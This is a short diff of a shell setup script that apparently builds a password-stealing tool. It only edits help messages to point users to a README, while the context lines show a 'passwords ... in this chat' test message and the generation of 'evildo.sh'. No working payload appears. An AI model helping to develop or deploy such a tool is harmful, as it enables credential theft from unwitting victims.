@@ -97,7 +97,7 @@ y|Y)
 break
 ;;
 n|N) 
-echo "Watch a video guide: ((((((LIIIIIIINKKKKKK())))))"
+echo "Follow the guide mentioned in README"
 ;;
 *)
 echo "Unrecognised option"
@@ -128,7 +128,7 @@ All passwords and stuff will be here, in this chat!
 Happy hacking!
 " &> /dev/null
 echo -e '\e[32mGreat! I have sent you a test message! Check for it \e[0m'
-echo -e '\e[1;33mWarning: if you have not recived any messages, I suggest you to check data you wrote or refer to video in README \e[0m'
+echo -e '\e[1;33mWarning: if you have not recived any messages, I suggest you to check data you wrote or refer to README file. \e[0m'
 
 echo -e "\e[32mGenerating evildo.sh...\e[0m"
 if [ -f "evildo.sh" ]; then 
